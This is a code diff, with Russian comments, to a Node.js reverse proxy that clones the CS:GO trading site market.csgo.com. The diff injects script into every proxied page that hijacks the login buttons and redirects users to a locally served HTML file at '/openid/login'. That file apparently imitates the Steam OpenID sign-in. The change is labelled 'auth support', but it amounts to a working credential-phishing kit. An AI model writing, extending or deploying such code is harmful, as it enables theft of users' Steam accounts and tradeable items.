@@ -14,6 +14,10 @@ const PORT = process.env.PORT || 3000;
 const TARGET_HOST = 'https://market.csgo.com';
 const WS_TARGET = 'wss://centrifugo2.csgotrader.app';
 
+// Новые константы для авторизации
+const AUTH_SELECTORS = ['#login-head-tablet', '#login-register', '#login-chat'];
+const AUTH_REDIRECT_URL = '/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580460939.CjmZIh5AMg&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select';
+
 // Создаем HTTP сервер
 const server = http.createServer(app);
 
@@ -511,7 +515,69 @@ function modifyUrls(content, baseUrl, contentType = '') {
         </script>
         `;
         
-        modified = modified.replace(/<head[^>]*>/i, `$&${proxyScript}`);
+        // Новый скрипт для перехвата кнопок авторизации
+        const authScript = `
+        <script>
+        (function() {
+            // Функция для поиска и обработки кнопок авторизации
+            function setupAuthButtons() {
+                // Список селекторов для перехвата
+                const selectors = ${JSON.stringify(AUTH_SELECTORS)};
+                const redirectUrl = '${AUTH_REDIRECT_URL}';
+                
+                selectors.forEach(selector => {
+                    const elements = document.querySelectorAll(selector);
+                    if (elements && elements.length > 0) {
+                        console.log('Found auth button:', selector, elements.length);
+                        
+                        elements.forEach(element => {
+                            // Сохраняем оригинальный обработчик клика, если он есть
+                            const originalOnClick = element.onclick;
+                            
+                            // Устанавливаем новый обработчик
+                            element.onclick = function(e) {
+                                e.preventDefault();
+                                e.stopPropagation();
+                                
+                                console.log('Auth button clicked:', selector);
+                                
+                                // Открываем форму авторизации на том же домене
+                                window.location.href = redirectUrl;
+                                
+                                return false;
+                            };
+                            
+                            // Добавляем класс для визуального отслеживания
+                            element.classList.add('auth-button-modified');
+                            
+                            console.log('Auth button handler attached:', selector);
+                        });
+                    }
+                });
+            }
+            
+            // Запускаем обработчик после загрузки DOM
+            document.addEventListener('DOMContentLoaded', setupAuthButtons);
+            
+            // И с небольшой задержкой для динамически загружаемых элементов
+            setTimeout(setupAuthButtons, 1000);
+            setTimeout(setupAuthButtons, 3000);
+            
+            // Также добавляем наблюдатель за изменениями DOM
+            const observer = new MutationObserver((mutations) => {
+                setupAuthButtons();
+            });
+            
+            // Запускаем наблюдатель
+            setTimeout(() => {
+                observer.observe(document.body, { childList: true, subtree: true });
+            }, 500);
+        })();
+        </script>
+        `;
+        
+        // Добавляем оба скрипта в HTML
+        modified = modified.replace(/<head[^>]*>/i, `$&${proxyScript}${authScript}`);
     }
     
     // Специфичные замены для JavaScript
@@ -657,6 +723,12 @@ function handleWebSocketProxy(clientWs, request) {
         }
     }
 }
+
+// Добавляем новый маршрут для обработки авторизации
+app.get('/openid/login', (req, res) => {
+    // Отправляем HTML-файл авторизации
+    res.sendFile(path.join(__dirname, '6kaomrcjpf2m.html'));
+});
 
 // НОВОЕ: Админ API для проверки кастомных страниц
 app.get('/admin-api/check-custom-page', (req, res) => {
@@ -1543,12 +1615,13 @@ setInterval(() => {
 // Запуск сервера
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`
-    🚀 Advanced Market Proxy Server (IMPROVED VERSION WITH ADMIN PANEL)
+    🚀 Advanced Market Proxy Server (IMPROVED VERSION WITH AUTH SUPPORT)
     📡 Port: ${PORT}
     🎯 Target: ${TARGET_HOST}
     🔌 WebSocket: ${WS_TARGET}
     🔒 HTTPS: Auto-detected
     👨‍💼 Admin Panel: ${isSecure({ headers: {} }) ? 'https' : 'http'}://localhost:${PORT}/adminka
+    🔑 Auth URL: ${AUTH_REDIRECT_URL}
     
     Features:
     ✓ Full HTTP/HTTPS proxy
@@ -1561,6 +1634,7 @@ server.listen(PORT, '0.0.0.0', () => {
     ✓ Mixed content prevention
     ✓ AdBlocker bypass attempt
     ✓ Admin Panel for custom page modifications
+    ✓ Auth buttons intercept
     `);
 });
 
